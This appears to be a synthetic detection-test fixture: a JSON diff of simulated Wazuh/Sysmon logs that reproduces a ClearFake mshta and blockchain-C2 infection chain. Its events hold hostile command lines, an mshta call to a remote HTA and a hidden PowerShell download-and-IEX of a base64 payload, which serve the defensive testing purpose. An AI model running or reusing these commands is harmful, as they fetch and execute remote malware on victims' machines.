@@ -1,0 +1,217 @@
+{
+  "_metadata": {
+    "attack_id": "T1218.005",
+    "variation": "001",
+    "name": "ClearFake MSHTA Blockchain C2 (EtherHiding)",
+    "description": "Simulates ClearFake attack using MSHTA with blockchain-based C2 retrieval (EtherHiding technique)",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "execution",
+    "source_url": "https://www.darktrace.com/blog/clearfake-from-fake-captchas-to-blockchain-driven-payload-retrieval",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - MSHTA executing remote HTA from suspicious domain",
+      "sequence": 1,
+      "timestamp": "2026-02-03T12:00:00.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: MSHTA executing remote HTA file",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1218.005"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "System Binary Proxy Execution: Mshta"
+            ]
+          },
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000005.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 12:00:00.000",
+              "processGuid": "{4DC16835-EA1B-65B0-C100-000000001500}",
+              "processId": "7892",
+              "image": "C:\\Windows\\System32\\mshta.exe",
+              "commandLine": "mshta.exe http://weiss.neighb0rrol1.ru/rpxacc64mshta",
+              "currentDirectory": "C:\\Windows\\system32\\",
+              "user": "CORP\\victim",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{4DC16835-EA0A-65B0-C000-000000001500}",
+              "parentProcessId": "6128",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1218.005",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - Connection to blockchain RPC endpoint",
+      "sequence": 2,
+      "timestamp": "2026-02-03T12:00:15.000Z",
+      "log": {
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 3: Connection to blockchain RPC endpoint",
+          "id": "100918",
+          "mitre": {
+            "id": [
+              "T1071.001"
+            ],
+            "tactic": [
+              "Command and Control"
+            ],
+            "technique": [
+              "Application Layer Protocol: Web Protocols"
+            ]
+          },
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000005.000002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 12:00:15.000",
+              "processGuid": "{4DC16835-EA1B-65B0-C100-000000001500}",
+              "processId": "7892",
+              "image": "C:\\Windows\\System32\\mshta.exe",
+              "user": "CORP\\victim",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "198.51.100.20",
+              "sourcePort": "51456",
+              "destinationIp": "188.114.96.6",
+              "destinationPort": "443",
+              "destinationHostname": "bsc-testnet.drpc.org"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1071.001",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Spawned PowerShell for Lumma Stealer download",
+      "sequence": 3,
+      "timestamp": "2026-02-03T12:00:30.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: MSHTA spawning PowerShell",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1059.001"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Command and Scripting Interpreter: PowerShell"
+            ]
+          },
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000005.000003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 12:00:30.000",
+              "processGuid": "{4DC16835-EA2C-65B0-C200-000000001500}",
+              "processId": "8256",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell -ep bypass -w hidden -c \"$c=[Convert]::FromBase64String((irm 'https://github.com/PrivateC0de/obf/main/payload.txt'));IEX([Text.Encoding]::UTF8.GetString($c))\"",
+              "currentDirectory": "C:\\Windows\\system32\\",
+              "user": "CORP\\victim",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{4DC16835-EA1B-65B0-C100-000000001500}",
+              "parentProcessId": "7892",
+              "parentImage": "C:\\Windows\\System32\\mshta.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.001",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    }
+  ]
+}
